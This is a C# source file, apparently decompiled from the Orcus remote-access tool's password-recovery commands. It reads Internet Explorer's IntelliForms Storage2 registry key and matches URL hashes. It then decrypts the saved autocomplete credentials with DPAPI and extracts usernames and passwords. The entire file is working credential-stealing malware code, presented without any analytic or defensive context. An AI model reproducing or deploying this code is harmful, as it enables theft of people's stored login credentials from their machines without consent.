using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using Orcus.Native;

namespace Orcus.Commands.Passwords.Applications.InternetExplorer;

internal static class CryptoApi
{
	private const string KeyStr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

	private const uint PROV_RSA_FULL = 1u;

	private const uint CRYPT_VERIFYCONTEXT = 4026531840u;

	public static bool DecryptIePassword(string url, List<string[]> dataList)
	{
		string urlHashString = GetUrlHashString(url);
		if (!DoesUrlMatchWithHash(urlHashString))
		{
			return false;
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2");
		if (registryKey == null)
		{
			return false;
		}
		byte[] array = (byte[])registryKey.GetValue(urlHashString);
		registryKey.Close();
		byte[] array2 = new byte[2 * (url.Length + 1)];
		Buffer.BlockCopy(url.ToCharArray(), 0, array2, 0, url.Length * 2);
		byte[] array3 = ProtectedData.Unprotect(array, array2, (DataProtectionScope)0);
		IEAutoComplteSecretHeader iEAutoComplteSecretHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(array3);
		if (array3.Length >= iEAutoComplteSecretHeader.dwSize + iEAutoComplteSecretHeader.dwSecretInfoSize + iEAutoComplteSecretHeader.dwSecretSize)
		{
			uint num = iEAutoComplteSecretHeader.IESecretHeader.dwTotalSecrets / 2u;
			int num2 = Marshal.SizeOf(typeof(SecretEntry));
			byte[] array4 = new byte[iEAutoComplteSecretHeader.dwSecretSize];
			int srcOffset = (int)(iEAutoComplteSecretHeader.dwSize + iEAutoComplteSecretHeader.dwSecretInfoSize);
			Buffer.BlockCopy(array3, srcOffset, array4, 0, array4.Length);
			if (dataList == null)
			{
				dataList = new List<string[]>();
			}
			else
			{
				dataList.Clear();
			}
			srcOffset = Marshal.SizeOf((object)iEAutoComplteSecretHeader);
			for (int i = 0; i < num; i++)
			{
				byte[] array5 = new byte[num2];
				Buffer.BlockCopy(array3, srcOffset, array5, 0, array5.Length);
				SecretEntry secretEntry = ByteArrayToStructure<SecretEntry>(array5);
				string[] array6 = new string[3];
				byte[] array7 = new byte[secretEntry.dwLength * 2];
				Buffer.BlockCopy(array4, (int)secretEntry.dwOffset, array7, 0, array7.Length);
				array6[0] = Encoding.Unicode.GetString(array7);
				srcOffset += num2;
				Buffer.BlockCopy(array3, srcOffset, array5, 0, array5.Length);
				secretEntry = ByteArrayToStructure<SecretEntry>(array5);
				byte[] array8 = new byte[secretEntry.dwLength * 2];
				Buffer.BlockCopy(array4, (int)secretEntry.dwOffset, array8, 0, array8.Length);
				array6[1] = Encoding.Unicode.GetString(array8);
				array6[2] = urlHashString;
				dataList.Add(array6);
				srcOffset += num2;
			}
		}
		return true;
	}

	private static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
	{
		GCHandle gCHandle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
		T result = (T)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), typeof(T));
		gCHandle.Free();
		return result;
	}

	private static string GetUrlHashString(string wstrUrl)
	{
		IntPtr phHash = IntPtr.Zero;
		NativeMethods.CryptAcquireContext(out var phProv, string.Empty, string.Empty, 1u, 4026531840u);
		if (!NativeMethods.CryptCreateHash(phProv, ALG.ALG_ID.CALG_SHA1, IntPtr.Zero, 0u, ref phHash))
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		byte[] bytes = Encoding.Unicode.GetBytes(wstrUrl);
		StringBuilder stringBuilder = new StringBuilder(42);
		if (NativeMethods.CryptHashData(phHash, bytes, (wstrUrl.Length + 1) * 2, 0u))
		{
			uint pdwDataLen = 20u;
			byte[] array = new byte[20];
			if (!NativeMethods.CryptGetHashParam(phHash, HashParameters.HP_HASHVAL, array, ref pdwDataLen, 0u))
			{
				throw new Win32Exception(Marshal.GetLastWin32Error());
			}
			byte b = 0;
			stringBuilder.Length = 0;
			for (int i = 0; i < pdwDataLen; i++)
			{
				byte b2 = array[i];
				b = (byte)(b + b2);
				stringBuilder.AppendFormat("{0:X2}", b2);
			}
			stringBuilder.AppendFormat("{0:X2}", b);
			NativeMethods.CryptDestroyHash(phHash);
		}
		NativeMethods.CryptReleaseContext(phProv, 0u);
		return stringBuilder.ToString();
	}

	private static bool DoesUrlMatchWithHash(string urlHash)
	{
		bool result = false;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2");
		if (registryKey == null)
		{
			return false;
		}
		string[] valueNames = registryKey.GetValueNames();
		for (int i = 0; i < valueNames.Length; i++)
		{
			if (valueNames[i] == urlHash)
			{
				result = true;
				break;
			}
		}
		return result;
	}
}
